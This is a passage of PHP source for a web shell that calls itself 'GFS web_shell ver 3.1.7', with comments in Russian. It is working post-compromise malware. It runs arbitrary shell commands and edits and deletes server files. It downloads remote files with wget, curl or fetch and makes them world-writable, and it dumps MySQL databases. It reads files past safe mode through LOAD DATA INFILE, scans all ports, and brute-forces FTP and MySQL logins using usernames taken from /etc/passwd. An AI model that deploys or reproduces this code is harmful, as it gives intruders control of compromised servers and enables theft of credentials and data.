   }elseif(function_exists('system')){
    ob_start();
    system($comd);
    $res=ob_get_contents();
    ob_end_clean();
   }elseif(function_exists('passthru')){
    ob_start();
    passthru($comd);
    $res=ob_get_contents();
    ob_end_clean();
   }elseif(is_resource($f=popen($comd,"r"))){
    $res = "";
    while(!feof($f)) { $res.=fread($f,1024); }
    pclose($f);
  }
 }
 return $res;
}
function sysinfo()                             //Вывод SYSINFO
{
 global $curl_on, $dis_func, $mysql_stat, $safe_mode, $server, $HTTP_SERVER_VARS;
 echo("<b><font  face=Verdana size=2> System information:<br><font size=-2>
      <hr>");
 echo (($safe_mode)?("Safe Mode: </b><font color=green>ON</font><b> "):
         ("Safe Mode: </b><font color=red>OFF</font><b> "));
 $row_dis_func=explode(', ',$dis_func);
 echo ("PHP: </b><font color=blue>".phpversion()."</font><b> ");
 echo ("MySQL: </b>");
 if($mysql_stat){
  echo "<font color=green>ON </font><b>";
 }
 else {
  echo "<font color=red>OFF </font><b>";
 }
 echo "cURL: </b>";
 if($curl_on){
  echo "<font color=green>ON</font><b><br>";
 }else
  echo "<font color=red>OFF</font><b><br>";
 if ($dis_func!=""){
  echo "Disabled Functions: </b><font color=red>".$dis_func."</font><br><b>";
 }
 $uname=ex('uname -a');
 echo "OS: </b><font color=blue>";
 if (empty($uname)){
  echo (php_uname()."</font><br><b>");
 }else
  echo $uname."</font><br><b>";
 $id = ex('id');
 echo "SERVER: </b><font color=blue>".$server."</font><br><b>";
 echo "id: </b><font color=blue>";
 if (!empty($id)){
  echo $id."</font><br><b>";
 }else
  echo "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid().
       "</font><br><b>";
 echo "<b>RemoteAddress:</b><font color=red>".$HTTP_SERVER_VARS['REMOTE_ADDR']."</font><br>";
 if(isset($HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'])){
  echo "<b>RemoteAddressIfProxy:</b><font color=red>".$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR']."</font>";
 }
 echo "<hr size=3 color=black>";
 echo "</font></font>";
}
function read_dir($dir)                 //читаем папку
{
 $d=opendir($dir);
 $i=0;
 while($r=readdir($d)){
  $res[$i]=$r;
  $i++;
 }
 return $res;
}
function permissions($mode,$file) {            //определение свойств
 $type=filetype($file);
 $perms=$type[0];
 $perms.=($mode & 00400) ? "r" : "-";
 $perms.=($mode & 00200) ? "w" : "-";
 $perms.=($mode & 00100) ? "x" : "-";
 $perms.=($mode & 00040) ? "r" : "-";
 $perms.=($mode & 00020) ? "w" : "-";
 $perms.=($mode & 00010) ? "x" : "-";
 $perms.=($mode & 00004) ? "r" : "-";
 $perms.=($mode & 00002) ? "w" : "-";
 $perms.=($mode & 00001) ? "x" : "-";
 $perms.="(".$mode.")";
 return $perms;
}
function open_file($fil, $m, $d)                          //Открыть файл
{
 if (!($fp=fopen($fil,$m))) {
  $res="Error opening file!\n";
 }else{
  ob_start();
  readfile($fil);
  $res=ob_get_contents();
  ob_end_clean();
  if (!(fclose($fp))){
   $res="ERROR CLOSE";
  }
 }
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr><td alling=center><b>&nbsp;&nbsp;&nbsp;".$fil."&nbsp;&nbsp;&nbsp;</b></td></tr>";
 echo "<tr><td alling=center><textarea name=\"text\" cols=90 rows=15>";
 echo $res;
 echo "</textarea></td></tr>";
 if(is_writable($fil)){
  echo "<input type=\"hidden\" value='".$fil."' name=\"fname\">";
  echo "<input type=\"hidden\" value='".$d."' name=\"dname\">";
  echo "<tr><td alling=center><input style='width:100px;' type=\"submit\" value=\"Save\" name=\"b_save\"></td></tr>";
 }
 echo "</form></table>";
}
function save_file($res,$fil, $d)                     //Сохранить файл
{
 unlink($fil);
 $fp=fopen($fil,"wb");
 if(!$fp){
  $res="Error create file!\n".$fp;
 }else{
  if (fwrite($fp,$res)){
   if (fclose($fp)){
    $res="File save succesfuly!\n";
   }else $res="Erorr close!\n";
  }else $res="Error wright!\n";
 }
 umask(0000);
 chmod($fil,0777);
 return $res;
}
function strmass($mass){
 $res="";
 foreach($mass as $k=>$v){
  $res.=$v."|";
 }
 return $res;
}
function sortbyname($fnames, $d)
{
 $filenames="";
 $foldernames="";
 $numnames=count($fnames);
 for($i=0;$i<=$numnames;$i++){
  if(is_dir($d."/".$fnames[$i])){
   $foldernames.=$fnames[$i]."|";
  }else
   $filenames.=$fnames[$i]."|";
 }
 $mass1=explode("|",$foldernames);
 $mass2=explode("|",$filenames);
 sort($mass1);
 sort($mass2);
 $mass1=strmass($mass1);
 $mass2=strmass($mass2);
 $mass=explode("|",$mass1.$mass2);
 return $mass;
}
function list_dir($d)                     //Навигация
{
 global $HTTP_REFERER;
 if(isset($_POST['b_up']) OR isset($_POST['b_open_dir'])){
  chdir($_POST['fname']);
  $d=getcwd();
 }else
  $d=getcwd();
 if($_POST['b_new_dir']){
  mkdir($_POST['new']);
  chmod($_POST['new'],0777);
  $d=$_POST['new'];
 }
 if($_POST['b_del'] AND is_dir($_POST['fname'])){
  rmdir($_POST['fname']);
  chdir($_POST['dname']);
  $d=getcwd();
 }
 if($_POST['b_del'] AND !is_dir($_POST['fname'])){
  unlink($_POST['fname']);
  chdir($_POST['dname']);
  $d=getcwd();
 }
 if($_POST['b_change_dir']){
  chdir($_POST['change_dir']);
  $d=getcwd();
 }
 if($_POST['b_new_file'] OR $_POST['b_open_file']){
  chdir($_POST['dname']);
  $d=getcwd();
 }
 $dir=read_dir($d);
 $dir=sortbyname($dir,$d);
 $count=count($dir);
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b>Navigation</b></td></tr>";
 if(is_writable($d)){
  echo "<tr><td alling=\"center\"><input style='width:200px;' type=\"text\" value=\"$d\" name=\"new\"></td><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"NewDir\" name=\"b_new_dir\"></td>";
  echo "<td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"NewFile\" name=\"b_new_file\"></td></tr>";
 }
 echo "<tr><td alling=\"center\"><input style='width:200px;' type=\"text\" value=\"$d\" name=\"change_dir\"></td><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"ChangeDir\" name=\"b_change_dir\"></td></tr>";
 if(!$safe_mode){
  echo "<tr><td alling=\"center\"><input style='width:200px;' type=\"text\" value=\"\" name=\"ffile\"></td><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"FindeFile\" name=\"b_f_file\"></td></tr>";
 }
 echo "</table></form>";
 echo "<table CELLPADDING=0 CELLSPACING=0 bgcolor=#98FAFF BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>";
 echo "<tr bgcolor=#ffff00><td><b>&nbsp;&nbsp;&nbsp;Directory&nbsp;&nbsp;&nbsp;</b></td><td alling=\"center\"><b>&nbsp;&nbsp;&nbsp;Permission&nbsp;&nbsp;&nbsp;</b></td><td alling=\"center\"><b>&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;</b></td><td alling=\"center\"><b>&nbsp;&nbsp;&nbsp;Owner/Group&nbsp;&nbsp;&nbsp;</b></td><td alling=\"center\"><b>&nbsp;&nbsp;&nbsp;Action&nbsp;&nbsp;&nbsp;</b></td>";
 for($i=0; $i<$count; $i++){
  if($dir[$i]!=""){
   $full=$d."/".$dir[$i];
   $perm=permissions(fileperms($full),$dir[$i]);
   $file=$d."/".$dir[$i];
   echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
   if(is_dir($file)){
    echo "<tr bgcolor=#98FA00><td>".$dir[$i]."&nbsp;&nbsp;&nbsp;</td><input type=\"hidden\" value='".$d."' name=\"dname\"><input type=\"hidden\" value='".$file."' name=\"fname\"><td alling=\"center\">".$perm.
          "&nbsp;&nbsp;&nbsp;</td><td alling=\"center\">".filesize($dir[$i])."&nbsp;&nbsp;&nbsp;</td><td alling=\"center\">&nbsp;&nbsp;&nbsp;".fileowner($dir[$i])."&nbsp;&nbsp;&nbsp;".filegroup($dir[$i])."&nbsp;&nbsp;&nbsp;</td>";
   }elseif(is_file($file)){
    echo "<tr><td>".$dir[$i]."&nbsp;&nbsp;&nbsp;</td><input type=\"hidden\" value='".$d."' name=\"dname\"><input type=\"hidden\" value='".$file."' name=\"fname\"><td alling=\"center\">".$perm.
         "&nbsp;&nbsp;&nbsp;</td><td alling=\"center\">".filesize($dir[$i])."&nbsp;&nbsp;&nbsp;</td><td alling=\"center\">&nbsp;&nbsp;&nbsp;".fileowner($dir[$i])."&nbsp;&nbsp;&nbsp;".filegroup($dir[$i])."&nbsp;&nbsp;&nbsp;</td>";
   }else
     echo "<tr bgcolor=#ffff00><td>".$dir[$i]."&nbsp;&nbsp;&nbsp;</td><input type=\"hidden\" value='".$d."' name=\"dname\"><input type=\"hidden\" value='".$file."' name=\"fname\"><td alling=\"center\">".$perm.
         "&nbsp;&nbsp;&nbsp;</td><td alling=\"center\">".filesize($dir[$i])."&nbsp;&nbsp;&nbsp;</td><td alling=\"center\">&nbsp;&nbsp;&nbsp;".fileowner($dir[$i])."&nbsp;&nbsp;&nbsp;".filegroup($dir[$i])."&nbsp;&nbsp;&nbsp;</td>";
   if(is_dir($file)){
    echo "<td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Listing\" name=\"b_open_dir\"></td>";
   }elseif(is_readable($file)){
    echo "<td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Open\" name=\"b_open_file\"></td>";
   }
   if(is_writable($file) AND $file!=".."){
    echo "<td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Delete\" name=\"b_del\"></td>";
   }
   if(is_readable($file) AND !is_dir($file)){
    echo "<td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Download\" name=\"b_down\"></td>";
   }
   echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\"></tr>";
   echo "</form>";
  }
 }
 echo "</table>";
 closedir($d);
}
function up_file($fil,$tfil, $box)                   //Загрузка файлов на сервер
{
 global $_FILES;
 if ($tfil==""){
  $res="Target is failde!";
 }
 if ($box=="PC"){
  if(copy($_FILES["filename"]["tmp_name"],$tfil)){
   chmod($tfil,0777);
   if(file_exists($tfil)){
    $res="Ok";
   }else
    $res="False";
  }else {
    $res="Error loading file!";
  }
 }
 if($box=="WGET") {
  $load="wget ".$fil." -O ".$tfil."";
  $res=ex($load);
   if(file_exists($tfil)){
    $res="Ok";
   }else
    $res="False";
  chmod($tfil,0777);
 }
 if($box=="FETCH"){
  $load="fetch -o ".$tfil." -p ".$fil."";
  $res=ex($load);
   if(file_exists($tfil)){
    $res="Ok";
   }else
    $res="False";
  chmod($tfil,0777);
 }
 if($box=="LYNX"){
  $load="lynx -source ".$fil." > ".$tfil."";
  $res=ex($load);
   if(file_exists($tfil)){
    $res="Ok";
   }else
    $res="False";
  chmod($tfil,0777);
 }
 if($box=="cURL"){
  $load="curl"." ".$fil." -o ".$tfil."";
  $res=ex($load);
   if(file_exists($tfil)){
    $res="Ok";
   }else
    $res="False";
  chmod($tfil,0777);
 }
 if($box=="fopen"){
  $data=implode("", file($fil));
  $fp=fopen($tfil, "wb");
  fputs($fp,$data);
  fclose($fp);
  chmod($tfil,0777);
   if(file_exists($tfil)){
    $res="Ok";
   }else
    $res="False";
 }
 return $res;
}
function run_sql($comd, $db,$host, $username, $pass)   //Результат SQL запроса
{
 if ($comd!=""){
  if ($db!=""){
   $connect=mysql_connect($host, $username, $pass);
   if (!$connect) {
    $res='Could not connect to MySQL';
   }
   mysql_select_db ($db);
   $row=mysql_query($comd);
   while ($r= mysql_fetch_row($row)) {
    $res.="&nbsp;".implode($r);
   }
   $result=$res;
   mysql_free_result($row);
   mysql_free_result($r);
   mysql_close($connect);
  }else $result="Select data base!";
 }else $result="No command!";
 return $result;
}
function db_show($host, $username, $pass)             //Вывод имеющихся БД
{
 $res="Exists BD: \n";
 $connect=mysql_connect($host, $username, $pass);
 if (!$connect){
  $res="Could not connect to MySQL!\n".mysql_error();
 }else{
  $db_list=mysql_list_dbs($connect);
  while ($row = mysql_fetch_object($db_list)) {
   $res.=$row->Database . "\n";
  }
  mysql_close($connect);
 }
 return $res;
}
function show_tables($bd, $host, $username, $pass)   //Вывод имеющихся таблиц
{
 if ($bd!=""){
  $res="Exists tables: \n";
  $connect=mysql_connect($host, $username, $pass);
  if (!$connect){
   $res="Could not connect to MySQL\n".mysql_error();
  }else{
   $r=mysql_query("SHOW TABLES FROM $bd");
   $res="Exist tables:\n";
   while ($row=mysql_fetch_row($r)) {
    $res.="Table: $row[0]\n";
    $fields=mysql_list_fields($bd, $row[0], $connect);
    $columns=mysql_num_fields($fields);
    $res.="| ";
    for ($i=0; $i<$columns; $i++) {
     $res.=mysql_field_name($fields, $i)." | ";
    }
    $res.="\n____________________________\n";
   }
   mysql_free_result($r);
   mysql_close($connect);
  }
 }else
  $res="Select data base! ";
 return $res;
}
function dump_table($tab, $db,$host, $username, $pass)  //Дамп таблицы
{
 $connect=mysql_connect($host, $username, $pass);
 if (!$connect) {
  $result="Could not connect to MySQL!\n".mysql_error();
 }else{
   if (!mysql_select_db($db,$connect)){
    $result="Could not connect to db!\n".mysql_error();
   }else{
    if ($db==""){
     $result="Select data base!";
    }else{
     $res1="# MySQL dump of $tab\r\n";
     $r=mysql_query("SHOW CREATE TABLE `".$tab."`", $connect);
     $row=mysql_fetch_row($r);
     $res1.=$row[1]."\r\n\r\n";
     $res1.= "# ---------------------------------\r\n\r\n";
     $res2 = '';
     $r=mysql_query("SELECT * FROM `".$tab."`", $connect);
     if (mysql_num_rows($r)>0){
      while (($row=mysql_fetch_assoc($r))){
       $keys=implode("`, `", array_keys($row));
       $values=array_values($row);
       foreach($values as $k=>$v){
        $values[$k]=addslashes($v);
       }
       $values=implode("', '", $values);
       $res2.="INSERT INTO `".$tab."` (`".$keys."`) VALUES ('".htmlspecialchars($values)."');\r\n";
      }
      $res2.="\r\n# ---------------------------------";
     }
     $result=$res1.$res2;
     mysql_close($db);
    }
   }
 }

 return $result;
}
function down_tb($tab, $db,$host, $username, $pass){
 $connect=mysql_connect($host, $username, $pass);
 if (!$connect) {
  die("Could not connect to MySQL!\n".mysql_error());
 }else{
   if (!mysql_select_db($db,$connect)){
    die("Could not connect to db!\n".mysql_error());
   }else{
    if ($db==""){
     die("Select data base!");
    }else{
     $res1="";
     $r=mysql_query("SELECT * FROM `".$tab."`", $connect);
     if (mysql_num_rows($r)>0){
      while (($row=mysql_fetch_assoc($r))){
       foreach($row as $k=>$v){
        $res1.=$v."\t";
       }
       $res1.="\n";
      }
     }
     mysql_close($db);
    }
   }
 }

 return $res1;
}
function safe_mode_fuck($fil,$host, $username, $pass, $dbname)//Обход безопасного режима
{
 $connect=mysql_connect($host,$username,$pass);
 if($connect){
  if(mysql_select_db($dbname,$connect)){
   $c="DROP TABLE IF EXISTS temp_gfs_table;";
   mysql_query($c);
   $c="CREATE TABLE `temp_gfs_table` ( `file` LONGBLOB NOT NULL );";
   mysql_query($c);
   $c="LOAD DATA INFILE \"".$fil."\" INTO TABLE temp_gfs_table;";
   mysql_query($c);
   $c="SELECT * FROM temp_gfs_table;";
   $r=mysql_query($c);
   while(($row=mysql_fetch_array($r))){
    $res.=htmlspecialchars($row[0]);
   }
   $c="DROP TABLE IF EXISTS temp_gfs_table;";
   mysql_query($c);
   }else
    $res= "Can't select database";
  mysql_close($db);
  }else
   $res="Can't connect to mysql server";
 return $res;
}
function portscan($host)
{
 global $port;
 echo "<table BORDER=1 align=center>";
 echo "<tr><td alling=center>Host:  </td><td alling=center><b><font color=green> ".$host." </b></font></td></tr>";
 for($i=1; $i<=65535; $i++){
  $fp=fsockopen($host, $i, $errno, $errstr, 4);
  if($fp){
   fclose($fp);
   if(isset($port[$i])){
    $k=$port[$i];
   }else
    $k=getservbyport($i, "TCP");
   if($k==""){$k="N\A";}
   echo "<tr><td alling=center>Port: ".$i." </td><td alling=center><b><font color=green>".$k."</b></font></td>";
   echo "</tr>";
  }
 }
 echo "</table>";
}
function pwd_conwert()
{
 $res="";
 if(file_exists("/etc/passwd")){
  $input=implode(file("/etc/passwd"));
  $input=explode("\n", $input);
  foreach($input as $i=>$v){
   $word=explode(":",$v);
   $res.=$word[0]." ";
  }
  $res=explode(" ",$res);
 }else{
  $input=implode(ex("cat /etc/passwd"));
  $input=explode("\n", $input);
  foreach($input as $i=>$v){
   $word=explode(":",$v);
   $res.=$word[0]." ";
  }
  $res=explode(" ",$res);
 }
 return $res;
}
function brute($type,$type2,$host,$file)
{
 if($type2=="login:login"){
  if($type=="ftp"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteFTP:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     $conn_id=ftp_connect($host);
     if(!$conn_id){ die("Coud not connect");}
     if (ftp_login($conn_id, $v, $v)){
      echo "<tr><td alling=center> ".$v." : ".$v." </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
     }else
      echo "<tr><td alling=center> ".$v." : ".$v." </td><td alling=center><b><font color=red> NO </b></font></td></tr>";
     ftp_close($conn_id);
    }
   }
   echo "</table>";
  }elseif($type=="mysql"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteMySQL:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     $conn_id=mysql_connect($host,$v,$v);
     if($conn_id){
      echo "<tr><td alling=center> ".$v." : ".$v." </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
     }else
      echo "<tr><td alling=center> ".$v." : ".$v." </td><td alling=center><b><font color=red> NO </b></font></td></tr>";
     mysql_close($conn_id);
    }
   }
   echo "</table>";
  }
 }elseif($type2=="login:empty"){
  if($type=="ftp"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteFTP:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     $conn_id=ftp_connect($host);
     if(!$conn_id){ die("Coud not connect");}
     if (ftp_login($conn_id, $v, "")){
      echo "<tr><td alling=center> ".$v." : empty </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
     }
     ftp_close($conn_id);
    }
   }
   echo "</table>";
  }elseif($type=="mysql"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteMySQL:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     $conn_id=mysql_connect($host,$v,"");
     if($conn_id){
      echo "<tr><td alling=center> ".$v." : empty </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
     }
     mysql_close($conn_id);
    }
   }
   echo "</table>";
  }
 }elseif($type2=="login:number"){
  if($type=="ftp"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteFTP:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     $conn_id=ftp_connect($host);
     if(!$conn_id){ die("Coud not connect");}
     for($j=0; $j<=999; $j++){
      if (ftp_login($conn_id, $v, "$j")){
       echo "<tr><td alling=center> ".$v." : $j </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
      }
      ftp_close($conn_id);
     }
    }
   }
   echo "</table>";
  }elseif($type=="mysql"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteMySQL:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     for($j=0; $j<=999; $j++){
      $conn_id=mysql_connect($host,$v,"$j");
      if($conn_id){
        echo "<tr><td alling=center> ".$v." : $j </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
       }
       mysql_close($conn_id);
     }
    }
   }
   echo "</table>";
  }
 }elseif($type2=="login:nigol"){
  if($type=="ftp"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteFTP:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     $conn_id=ftp_connect($host);
     if(!$conn_id){ die("Coud not connect");}
     if (ftp_login($conn_id, $v, strrev($v))){
      echo "<tr><td alling=center> ".$v." : ".strrev($v)." </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
     }else
      echo "<tr><td alling=center> ".$v." : ".strrev($v)." </td><td alling=center><b><font color=red> NO </b></font></td></tr>";
     ftp_close($conn_id);
    }
   }
   echo "</table>";
  }elseif($type=="mysql"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteMySQL:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     $conn_id=mysql_connect($host,$v,strrev($v));
     if($conn_id){
      echo "<tr><td alling=center> ".$v." : ".strrev($v)." </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
     }else
      echo "<tr><td alling=center> ".$v." : ".strrev($v)." </td><td alling=center><b><font color=red> NO </b></font></td></tr>";
     mysql_close($conn_id);
    }
   }
   echo "</table>";
  }
 }elseif($type2=="login:lib"){
  $input=file($file);
  foreach($input as $i=>$v){
   $word=explode(":",$v);
   $res.=$word[0]." ".$word[1]." ";
  }
  $lib=explode(" ",$res);
  if($type=="ftp"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteFTP:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     foreach($lib as $kk=>$vv){
      $conn_id=ftp_connect($host);
      if(!$conn_id){ die("Coud not connect");}
      if (ftp_login($conn_id, $v, $lib[$kk])){
       echo "<tr><td alling=center> ".$v." : ".$lib[$kk]." </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
      }
      ftp_close($conn_id);
     }
    }
   }
   echo "</table>";
  }elseif($type=="mysql"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteMySQL:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $mass=pwd_conwert();
   foreach($mass as $i=>$v){
    if($v!=""){
     foreach($lib as $kk=>$vv){
      $conn_id=mysql_connect($host,$v,$lib[$kk]);
      if($conn_id){
       echo "<tr><td alling=center> ".$v." : ".$lib[$kk]." </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
      }
      mysql_close($conn_id);
     }
    }
   }
   echo "</table>";
  }
 }elseif($type2=="lib:lib"){
  $input=file($file);
  foreach($input as $i=>$v){
   $word=explode(":",$v);
   $res.=$word[0]." ".$word[1]." ";
  }
  $lib=explode(" ",$res);
  if($type=="ftp"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteFTP:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $count_lib=count($lib);
   for($kk=0; $kk<$count_lib; $kk=$kk+2){
    $conn_id=ftp_connect($host);
    if(!$conn_id){ die("Coud not connect");}
    if (ftp_login($conn_id,$lib[$kk],$lib[$kk+1])){
     echo "<tr><td alling=center> ".$lib[$kk]." : ".$lib[$kk+1]." </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
    }
    ftp_close($conn_id);
   }
   echo "</table>";
  }elseif($type=="mysql"){
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center>BruteMySQL:  </td><td alling=center><b><font color=green> localhost </b></font></td></tr>";
   $count_lib=count($lib);
   for($kk=0; $kk<$count_lib; $kk=$kk+2){
    if($lib[$kk]!=""){
     $conn_id=mysql_connect($host,$lib[$kk],$lib[$kk+1]);
     if($conn_id){
      echo "<tr><td alling=center> ".$lib[$kk]." : ".$lib[$kk+1]." </td><td alling=center><b><font color=green> OK </b></font></td></tr>";
     }
     mysql_close($conn_id);
    }
   }
  echo "</table>";
  }
 }
}

////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// КОД //////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
echo $HTML;
echo "<font  face=Verdana size=2 color=blue><b>";
echo (rep_char("&nbsp;",15));
echo "GFS web_shell ver 3.1.7 </b></font>";
echo "<hr size=3 color=black>";
sysinfo();
echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
echo "<table BORDER=1 align=center>";
if($r_act=="nav" OR $r_act==NULL){
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><input type=radio checked name=\"r_act\" value=\"nav\"><b>Navigation</b></td>";
}else
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><input type=radio name=\"r_act\" value=\"nav\"><b>Navigation</b></td>";
if(!$safe_mode){
 if($r_act=="bind"){
  echo "<td alling=\"center\"><input type=radio checked name=\"r_act\" value=\"bind\"><b>BindPort</b></td>";
 }else
  echo "<td alling=\"center\"><input type=radio name=\"r_act\" value=\"bind\"><b>BindPort</b></td>";
}

if(function_exists(fsockopen)){
 if($r_act=="port"){
  echo "<td alling=\"center\"><input type=radio checked name=\"r_act\" value=\"port\"><b>PortScan</b></td>";
 }else
  echo "<td alling=\"center\"><input type=radio name=\"r_act\" value=\"port\"><b>PortScan</b></td>";
}
if($r_act=="brute"){
 echo "<td alling=\"center\"><input type=radio checked name=\"r_act\" value=\"brute\"><b>Brute</b></td>";
}else
 echo "<td alling=\"center\"><input type=radio name=\"r_act\" value=\"brute\"><b>Brute</b></td>";
if($r_act=="eval"){
 echo "<td alling=\"center\"><input type=radio checked name=\"r_act\" value=\"eval\"><b>Eval</b></td>";
}else
 echo "<td alling=\"center\"><input type=radio name=\"r_act\" value=\"eval\"><b>Eval</b></td>";
echo "<td><input type=submit name=\"b_act\" value=\"Change\"></td></tr></table></form>";
################## ACTION ######################################################
if($r_act=="nav" OR $r_act==NULL){
 $box=$_POST['box'];
 if($_POST['b_save']){
  $res=save_file($_POST['text'],$_POST['fname'],$_POST['dname']);
 }elseif($_POST['b_new_file']){
  open_file($_POST['new'],"wb",$_POST['dname']);
 }elseif($_POST['b_open_file']){
  open_file($_POST['fname'],"r",$_POST['dname']);
 }elseif($_POST['b_mail']){
  $res="Function under construction!!!!!!!!!";
 }elseif($_POST['b_run']){
  chdir($_POST['wdir']);
  $dir=getcwd();
  $res=ex($_POST['cmd']);
 }elseif($_POST['b_f_file']){
  chdir($_POST['wdir']);
  $dir=getcwd();
  $res=ex("whereis ".$_POST['ffile']);
 }elseif($_POST['b_upload']){
  $s="Uploading file ".$_POST['lfilename']." use the ".$box;
  $res=up_file($_POST['lfilename'],$_POST['tfilename'],$_POST['box']);
 }elseif($_POST['b_mydb']){                              //Выводим список БД
  $s="show_exists_db";
  $res=db_show($_POST['host'], $_POST['username'], $_POST['pass']);
 }elseif ($_POST['b_runsql']){                           //Выполняем SQL запрос
  $s="SQL: ".$sql;
  $res=run_sql($_POST['sql'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);
 }elseif($_POST['b_base']){                              //Выводим список таблиц
  $s="show_exists_tables";
  $res=show_tables($_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);
 }elseif($_POST['b_table']){                             //Выводим дамп таблицы
  $s="Dump of ".$_POST['tablename'];
  $tablename=$_POST['tablename'];
  if ($tablename!=""){
   $res=dump_table($_POST['tablename'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);
  }else
   $res="Select table!";
 }elseif($_POST['b_safe_fuck']){                        //Обход безопасного режима
  $s="Open file ".$sfilename." with MySQL:";
  $res=safe_mode_fuck($_POST['sfilename'],$_POST['host'], $_POST['username'], $_POST['pass'], $_POST['dbname']);
 }elseif($_POST['b_dfilename']){                        //Обход безопасного режима
  $s="Dump in ".$dfilename." from ".$_POST['tablename'].":";
  $res=run_sql("SELECT * INTO OUTFILE '".addslashes($_POST['dfilename'])."' FROM ".$_POST['tablename'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);
 }
 if ($host=="") {$host="localhost";}
 if(isset($res)){
  echo "<table BORDER=1 align=center>";
  echo "<tr><td alling=center><b>".$s."</b></td></tr>";
  echo "<tr><td alling=center><textarea name=\"text\" cols=90 rows=15>";
  echo $res;
  echo "</textarea></td></tr></table>";
 }
################## EXECUTE #####################################################
 if(!$safe_mode){
  $dir=getcwd();
  echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
  echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
  echo "<table BORDER=1 align=center>";
  echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>Run command: </b></td></tr><font size=-2>";
  echo "<tr><td alling=\"center\"><input style='width:300px;' type=\"text\" value=\"\" name=\"cmd\"></td><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Run\" name=\"b_run\"></td></tr>";
  echo "<tr><td alling=\"center\"><input style='width:300px;' type=\"text\" value=\"$dir\" name=\"wdir\"></td>";
  echo "</tr></table></form>";
 }
 echo "<hr size=3 color=black>";
#################### UPLOAD ####################################################
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
